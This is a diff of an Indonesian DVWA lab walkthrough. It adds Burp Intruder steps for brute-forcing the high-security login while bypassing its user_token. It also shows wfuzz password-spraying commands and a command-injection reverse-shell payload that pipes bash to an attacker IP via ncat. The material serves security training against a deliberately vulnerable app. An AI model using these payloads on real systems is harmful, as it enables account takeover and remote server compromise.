@@ -39,6 +39,43 @@ wfuzz --hs "incorrect" -c -z file,user-dvwa.txt -z file,/usr/share/seclists/Pass
 wfuzz --hs "incorrect" -c -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -b 'PHPSESSID=hash; security=low' 'http://<IP_Server>/DVWA/vulnerabilities/brute/index.php?username=admin&password=FUZZ&Login=Login'
 ``` 
 
+### Security High
+- Disini kita akan melakukan bypass terhadap **user_token**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2031.JPG)
+
+- Buat attack dengan type **Pitchfork** dan tempatkan payload pada parameter **password** dan **user_token**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2032.JPG)
+
+- Buat payload 1 dengan tipe **Simple List** dan klik load lalu pilih wordlist `/usr/share/seclists/Passwords/darkweb2017-top100.txt`
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2033.JPG)
+
+- Buat payload 2 dengan tipe **Recursive Grep**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2036.JPG)
+
+- Clear semua string di **Grep - Match** lalu Add string **incorrect**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2037.JPG)
+
+- Tekan tombol **Add** pada bagian **Grep Extract** lalu block hash token lalu pilih **Start at offset** dan **End at fixed length**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2038.JPG)
+
+- Pada bagian **Redirections** pilih **Always**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2039.JPG)
+
+- Pada tab **Resource pool** pilih **Create new resource pool** lalu centang **Maximum concurrent requests** dan isi 1. Jika sudah tekan tombol **Start Attack** untuk memulai penyerangan
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2040.JPG)
+
+- Setelah proses penyerangan selesai, kita bisa lakukan sorting berdasarkan length. Request yang memiliki length paling berbeda adalah hasil brute force nya
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2041.JPG)
+
 ## Command Injection
 Command Injection (Shell Injection) adalah celah keamanan web yang memungkinkan penyerang dapat mengeksekusi perintah sistem operasi (OS) sewenang-wenang di server yang menjalankan aplikasi, dan biasanya membahayakan aplikasi dan semua data.
 
@@ -77,7 +114,7 @@ nc -lnvp 9999
 127.0.0.1& ncat <IP_Attacker> 9999 -e /bin/bash
 ```
 
-### Security Hard
+### Security High
 Di level ini kita hanya bisa mengeksekusi 1 perintah saja
 ```sh
 127.0.0.1|ls
